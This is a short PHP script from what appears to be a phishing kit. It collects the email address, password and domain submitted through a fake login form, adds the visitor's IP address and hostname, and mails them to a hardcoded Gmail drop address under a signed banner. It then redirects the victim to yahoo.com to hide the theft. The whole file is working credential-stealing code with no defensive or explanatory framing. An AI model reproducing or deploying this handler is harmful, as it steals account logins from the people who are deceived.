<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message  = "==================+[ aBiLiTy ]+==================\n";
$message .= "Email Address       : ".$_POST['login']."\n";
$message .= "Password    : ".$_POST['passwd']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Domain      : ".$_POST['domain']."\n";

$message .= "=============+ [ Jboi Mensah ] +=============\n";

$send= "jayfunds001@gmail.com";

$subject = "Jhayboi Inbox";
$headers = "From:  Jay Mensah <tee@xxx.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);

header("Location: http://yahoo.com/");
?>